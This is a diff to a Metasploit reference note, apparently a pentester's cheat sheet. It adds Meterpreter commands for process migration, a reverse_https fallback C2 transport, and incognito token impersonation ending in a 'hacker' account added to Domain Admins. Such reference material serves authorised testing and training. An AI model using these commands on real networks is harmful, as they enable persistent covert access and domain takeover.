@@ -1,6 +1,6 @@
 # Metasploit
 
-#Metasploit #msfconsole #Meterpreter #PostExploitation #Payloads #Exploitation #Kerberos #ActiveDirectory #msfvenom #Pivoting
+#Metasploit #msfconsole #Meterpreter #PostExploitation #Payloads #Exploitation #Kerberos #ActiveDirectory #msfvenom #Pivoting #incognito #TokenImpersonation #migrate
 
 ## What is this?
 
@@ -203,6 +203,30 @@ getpid                     # current process ID
 ps                         # list running processes
 ```
 
+### Session Stability — migrate + transports
+
+The single biggest cause of a lost meterpreter session is the process it landed in dying (you exploited a service, or the user closed the app). **Migrate out of it immediately** into something long-lived:
+
+```bash
+migrate <PID>                       # move meterpreter into another process
+migrate -N explorer.exe             # migrate by NAME (msf picks the PID) — a stable, always-present host
+run post/windows/manage/migrate     # auto-pick a suitable target process
+```
+
+> [!warning] Migrate only into a process at **your integrity level or lower**, and match architecture where you can — migrating a SYSTEM meterpreter into a low-priv user's process *drops* your privileges; a bad target PID kills the session outright. Grab SYSTEM (or the token you want) **before** migrating, and prefer a process owned by the same user.
+
+**Transport resilience** — add a fallback C2 channel so a blocked/killed transport doesn't end the session, and beacon over HTTPS to blend in:
+
+```bash
+transport list                                      # show configured transports
+transport add -t reverse_https -l tun0 -p 8443      # add an HTTPS fallback (needs a matching handler)
+transport next                                      # rotate to the next transport now
+# HTTPS/bind payloads for when egress is filtered or you can't get a callback at all:
+#   windows/x64/meterpreter/reverse_https   — beacons out over TLS (firewall-friendly, looks like web)
+#   windows/x64/meterpreter/bind_tcp        — target LISTENS; you connect in (no outbound needed)
+set SessionCommunicationTimeout 0                   # don't auto-close a quiet session (long engagements)
+```
+
 ### Privilege Escalation
 
 ```bash
@@ -214,6 +238,23 @@ ps                         # find a privileged process
 steal_token 1836           # steal access token from PID 1836
 drop_token                 # revert to original token
 ```
+
+**Token impersonation via incognito** — the meterpreter way to hunt for and assume a **Domain Admin** (or other privileged) token left on a compromised host. If a DA has a session/service/scheduled-task on the box you own, you can impersonate them without their password — the classic local-admin → DA lateral step:
+
+```bash
+load incognito
+list_tokens -u              # delegation/impersonation tokens available, by USER
+list_tokens -g             # by GROUP (spot "Domain Admins")
+impersonate_token 'CORP\\Administrator'   # assume that token — note the DOUBLED backslash
+getuid                     # confirm you're now the impersonated principal
+rev2self                   # drop back to your original token
+
+# incognito can also weaponise the token directly (needs the privileges the token grants):
+add_user hacker P@ss123 -h <dc-ip>
+add_group_user "Domain Admins" hacker -h <dc-ip>
+```
+
+> [!tip] `list_tokens` only shows tokens for processes you can already touch — run it **after** `getsystem` (SYSTEM sees every token on the box). **Delegation** tokens (interactive/RDP logons) are fully reusable across the network; **Impersonation** tokens are local-only. A DA delegation token on a member server is the whole ballgame.
 
 ### File System
 
@@ -587,9 +628,12 @@ msfvenom -l encoders
 | Dump host's Kerberos tickets | `run post/windows/manage/kerberos_tickets` |
 | Trace Kerberos exchange | `set KerberosTicketTrace true` |
 | Search process memory (6.4+) | `search_mem -r "password"` |
+| Migrate for stability | `migrate -N explorer.exe` |
+| Impersonate a token (incognito) | `load incognito; list_tokens -u; impersonate_token 'CORP\\Administrator'` |
+| Add HTTPS fallback transport | `transport add -t reverse_https -l tun0 -p 8443` |
 
 ---
 
 *Created: 2026-03-02*
-*Updated: 2026-07-31*
+*Updated: 2026-09-01*
 *Model: claude-opus-5*
